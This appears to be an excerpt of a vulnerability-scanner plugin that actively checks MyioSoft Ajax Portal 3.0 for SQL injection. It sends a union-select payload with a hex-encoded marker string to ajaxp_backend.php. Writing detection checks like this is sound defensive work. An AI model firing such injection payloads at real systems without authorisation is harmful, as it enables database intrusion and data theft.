...
if(description)
{
  ...
  script_name("MyioSoft Ajax Portal <= 3.0 SQLi Vulnerability - Active Check");
  ...
  script_tag(name:"summary", value:"MyioSoft Ajax Portal is prone to an SQL injection (SQLi)
  ...
  script_tag(name:"affected", value:"Ajax Portal version 3.0 and probably prior.");
...
foreach dir (make_list_unique("/portal", http_cgi_dirs(port: port))) {
  ...
  res = http_get_cache(port: port, item: dir + "/ajaxp_backend.php");
  if (!res || res !~ "^HTTP/1\.[01] 200")
    continue;

  url = dir + "/ajaxp_backend.php?page=-1+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7--";
